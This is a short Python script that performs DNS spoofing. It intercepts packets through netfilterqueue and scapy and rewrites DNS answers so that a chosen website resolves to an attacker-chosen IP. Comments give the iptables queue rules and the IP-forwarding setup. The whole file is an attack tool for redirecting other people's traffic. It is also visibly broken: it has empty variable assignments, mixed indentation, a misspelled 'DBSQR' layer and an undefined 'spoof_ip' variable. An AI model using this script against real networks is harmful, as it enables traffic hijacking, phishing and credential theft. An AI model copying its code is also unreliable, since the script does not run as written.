#!/usr/bin/env python

#>> must run iptables -I INPUT -j NFQUEUE --queue-num 0 (use for packets whose destination is your computer)
#>> must run iptables -I OUTPUT -j NFQUEUE --queue-num 0 (use for packets whose source is your computer)
#must run iptables -I FORWARD -j NFQUEUE --queue-num 0 (use for packets being routed through your computer)
#in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward
#can clear with iptables --flush

import netfilterqueue
import scapy.all as scapy

spoof_to_ip = #ip you want to redirect to
spoofed_ip = #website you want redirected

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DBSQR].qname
        if str(spoofed_ip) in qname:
            print("Spoofing target for " + spoofed_ip)
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(str(scapy_packet))
    
    packet.accept() #let packet out of queue
    
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #get packets into queue
queue.run()